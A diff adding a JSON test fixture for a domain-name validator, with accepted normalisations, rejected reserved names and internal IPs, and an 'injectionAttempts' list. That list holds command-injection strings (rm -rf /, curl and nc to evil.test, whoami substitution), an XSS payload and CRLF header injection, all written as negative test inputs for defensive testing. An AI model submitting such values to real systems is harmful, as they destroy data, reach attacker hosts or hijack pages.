@@ -1,0 +1,139 @@
+{
+  "_comment": "Shared verbatim with warmhawk-site. The two validators are deliberately separate implementations across two trust boundaries; this fixture is what keeps them from drifting. Copy the file, never import across repos.",
+  "accepted": [
+    {
+      "input": "example.com",
+      "expected": "example.com",
+      "why": "plain"
+    },
+    {
+      "input": "  Example.COM  ",
+      "expected": "example.com",
+      "why": "trim and lower-case"
+    },
+    {
+      "input": "https://example.com/path?q=1",
+      "expected": "example.com",
+      "why": "url"
+    },
+    {
+      "input": "http://example.com:8080/",
+      "expected": "example.com",
+      "why": "url with port"
+    },
+    {
+      "input": "user@example.com",
+      "expected": "example.com",
+      "why": "email address"
+    },
+    {
+      "input": "example.com.",
+      "expected": "example.com",
+      "why": "trailing root dot"
+    },
+    {
+      "input": "www.example.com",
+      "expected": "example.com",
+      "why": "www prefix"
+    },
+    {
+      "input": "sub.domain.example.com",
+      "expected": "sub.domain.example.com",
+      "why": "deep subdomain"
+    },
+    {
+      "input": "<example.com>",
+      "expected": "example.com",
+      "why": "wrapping punctuation"
+    },
+    {
+      "input": "example-with-hyphens.com",
+      "expected": "example-with-hyphens.com",
+      "why": "hyphens"
+    },
+    {
+      "input": "www.example.co.uk",
+      "expected": "example.co.uk",
+      "why": "www stripped, multi-part TLD preserved"
+    },
+    {
+      "input": "xn--bcher-kva.com",
+      "expected": "xn--bcher-kva.com",
+      "why": "punycode is already allowlist-safe"
+    }
+  ],
+  "rejected": [
+    {
+      "input": "localhost",
+      "reason": "reserved-name"
+    },
+    {
+      "input": "printer.local",
+      "reason": "reserved-name"
+    },
+    {
+      "input": "app.internal",
+      "reason": "reserved-name"
+    },
+    {
+      "input": "metadata.google.internal",
+      "reason": "reserved-name"
+    },
+    {
+      "input": "169.254.169.254",
+      "reason": "ip-address"
+    },
+    {
+      "input": "192.168.1.1",
+      "reason": "ip-address"
+    },
+    {
+      "input": "8.8.8.8",
+      "reason": "ip-address"
+    },
+    {
+      "input": "::1",
+      "reason": "ip-address"
+    },
+    {
+      "input": "notadomain",
+      "reason": "single-label"
+    },
+    {
+      "input": "example.com<script>",
+      "reason": "not-a-domain"
+    },
+    {
+      "input": "-leading-hyphen.com",
+      "reason": "not-a-domain"
+    },
+    {
+      "input": "example..com",
+      "reason": "not-a-domain"
+    },
+    {
+      "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com",
+      "reason": "label-too-long"
+    },
+    {
+      "input": "anything.example",
+      "reason": "reserved-name"
+    },
+    {
+      "input": "test.invalid",
+      "reason": "reserved-name"
+    }
+  ],
+  "injectionAttempts": [
+    "example.com; rm -rf /",
+    "example.com && curl evil.test",
+    "example.com | nc evil.test 1234",
+    "example.com`whoami`",
+    "example.com$(whoami)",
+    "example.com'--",
+    "example.com\"><img src=x onerror=alert(1)>",
+    "example.com\r\nX-Injected: yes",
+    "example.com .evil.test",
+    "example.com/*comment*/"
+  ]
+}
